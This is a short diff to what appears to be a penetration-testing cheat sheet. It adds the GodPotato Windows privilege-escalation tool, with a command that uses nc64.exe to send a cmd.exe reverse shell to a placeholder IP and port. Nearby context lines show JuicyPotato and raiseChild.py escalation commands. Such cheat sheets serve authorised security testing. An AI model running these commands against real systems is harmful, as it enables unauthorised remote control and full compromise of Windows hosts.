@@ -2592,6 +2592,7 @@ $ raiseChild.py -target-exec <IP address> <domain>/<username>
 https://github.com/ohpe/juicy-potato
 https://github.com/itm4n/PrintSpoofer
 https://github.com/antonioCoco/RoguePotato
+https://github.com/BeichenDream/GodPotato
 ```
 
 - SeDebugPrivilege
@@ -4635,6 +4636,13 @@ C:\> JuicyPotato.exe -l <port> -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc
 
 ```
 https://github.com/antonioCoco/RoguePotato
+```
+
+- GodPotato
+
+```
+https://github.com/BeichenDream/GodPotato
+C:\> GodPotato-NET4.exe -cmd "nc64.exe -t -e C:\Windows\System32\cmd.exe <IP address> <port>"
 ```
 
 - Baron Samedit - CVE-2021-3156
